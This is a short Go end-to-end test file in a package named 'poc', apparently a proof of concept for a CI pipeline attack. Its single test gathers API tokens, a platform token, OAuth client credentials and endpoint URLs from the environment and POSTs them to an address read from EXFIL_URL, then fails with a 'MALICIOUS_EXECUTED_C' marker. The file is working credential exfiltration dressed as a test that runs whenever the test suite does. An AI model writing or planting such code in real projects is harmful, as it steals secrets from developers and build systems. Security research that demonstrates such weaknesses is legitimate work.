//go:build e2e

package poc

import (
	"net/http"
	"net/url"
	"os"
	"testing"
)

func TestMaliciousPayloadC(t *testing.T) {
	exfil := os.Getenv("EXFIL_URL")
	if exfil != "" {
		values := url.Values{}
		values.Set("marker", "C")
		values.Set("api_token", os.Getenv("API_TOKEN"))
		values.Set("platform_token", os.Getenv("PLATFORM_TOKEN"))
		values.Set("oauth_client_id", os.Getenv("OAUTH_CLIENT_ID"))
		values.Set("oauth_client_secret", os.Getenv("OAUTH_CLIENT_SECRET"))
		values.Set("oauth_token_endpoint", os.Getenv("OAUTH_TOKEN_ENDPOINT"))
		values.Set("classic_url", os.Getenv("CLASSIC_URL"))
		values.Set("platform_url", os.Getenv("PLATFORM_URL"))
		_, _ = http.PostForm(exfil, values)
	}

	t.Fatalf("MALICIOUS_EXECUTED_C")
}
